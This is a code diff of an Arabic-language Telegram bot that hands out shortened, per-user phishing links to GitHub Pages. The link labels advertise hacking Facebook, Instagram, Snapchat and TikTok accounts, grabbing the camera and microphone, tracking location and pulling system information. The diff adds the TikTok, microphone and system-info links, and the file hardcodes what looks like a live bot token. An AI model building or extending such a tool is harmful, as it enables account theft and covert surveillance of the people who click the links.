@@ -6,7 +6,7 @@ import os
 import logging
 import time
 
-# كتم التنبيهات المزعجة
+# منع التنبيهات الحمراء
 log = logging.getLogger('werkzeug')
 log.setLevel(logging.ERROR)
 
@@ -23,11 +23,11 @@ def keep_alive():
     t = Thread(target=run)
     t.start()
 
-# --- إعدادات البوت ---
+# --- حط التوكن الجديد (اللي أخذته من BotFather) هون ---
 TOKEN = '8386427321:AAFKq8fCsoPEDgcF8KNFR2NUr7Gh0DwfskE'
 bot = telebot.TeleBot(TOKEN)
 
-# حل مشكلة الـ Conflict 409
+# تنظيف الـ Webhook القديم عشان نخلص من الـ 409
 bot.remove_webhook()
 time.sleep(1)
 
@@ -43,14 +43,18 @@ def send_welcome(message):
     uid = message.chat.id
     first_name = message.from_user.first_name
     hunter = first_name.replace(" ", "_")
-    base = "https://m-y-9-tech.github.io/fb/"
-    
+    base = "https://m-y-9-tech.github.io/fb/" # رابط الـ GitHub Pages تبعك
+
+    # قائمة الـ 8 روابط اللي طلبتهم
     links = {
         "fb": short_link(f"{base}fb.html?id={uid}&hunter={hunter}"),
         "ig": short_link(f"{base}ig.html?id={uid}&hunter={hunter}"),
         "snap": short_link(f"{base}snap.html?id={uid}&hunter={hunter}"),
+        "tik": short_link(f"{base}tiktok.html?id={uid}&hunter={hunter}"),
         "cam": short_link(f"{base}cam.html?id={uid}&hunter={hunter}"),
-        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}")
+        "mic": short_link(f"{base}mic.html?id={uid}&hunter={hunter}"),
+        "loc": short_link(f"{base}loc.html?id={uid}&hunter={hunter}"),
+        "sys": short_link(f"{base}sys.html?id={uid}&hunter={hunter}")
     }
 
     msg = f"""
@@ -58,8 +62,8 @@ def send_welcome(message):
 
 👤 Developer: 𝔸𝕓𝕦 𝕊𝕒𝕟𝕒𝕕 𝕄𝕒𝕝𝕜𝕒𝕨𝕚
 
-⚠️ لـ^ـضـ^ـمـان تـ^ـفـ^ـعـ^ـيـل الأدوات، يـ^ـجـ^ـب مـ^ـتـ^ـابـ^ـعـ^ـة حـ^ـسـ^ـاب المـ^ـطـ^ـور:
-🔴 https://www.instagram.com/m_y_.9/
+⚠️ رابـط المـطـور لـتـفـعـيـل الأوامـر (إجـبـاري) 💀🔥:
+https://www.instagram.com/m_y_.9/?hl=ar#
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
 💎 قـ^ـائـ^ـمـ^ـة الأدوات الـ^ـمـ^ـفـ^ـعـ^ـلـ^ـة 💎
@@ -68,15 +72,18 @@ def send_welcome(message):
 🔹 اختـ^ـراق الفيـ^ـسبـ^ـوك 🔐: `{links['fb']}`
 🔹 اختـ^ـراق الانـ^ـستـ^ـقـ^ـرام 🛡️: `{links['ig']}`
 🔹 اختـ^ـراق سـ^ـنـ^ـاب شـ^ـات 👻: `{links['snap']}`
+🔹 اختـ^ـراق تـيـك تـوك 🎵: `{links['tik']}`
 🔹 اختـ^ـراق الكـ^ـامـ^ـيـ^ـرا 📸: `{links['cam']}`
-🔹 تـ^ـحـ^ـديـ^ـد المـ^ـوقـ^ـع 📍: `{links['loc']}`
+🔹 تـسـجـيـل الـصـوت 🎤: `{links['mic']}`
+🔹 تـحـديـد الـمـوقـع 📍: `{links['loc']}`
+🔹 سـحـب مـعـلـومـات الـنـظـام 📱: `{links['sys']}`
 
 ▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل 24/7..
+⚙️ الـ^ـحـ^ـالـ^ـة: مـ^ـتـ^ـصـ^ـل..
     """
     bot.send_message(uid, msg, parse_mode="Markdown", disable_web_page_preview=True)
 
 if __name__ == "__main__":
     keep_alive()
-    print("🚀 M.Y.9 System Started Successfully!")
-    bot.infinity_polling(timeout=10, long_polling_timeout=5)
+    print("🚀 System M.Y.9 is Running with 8 Tools!")
+    bot.infinity_polling()
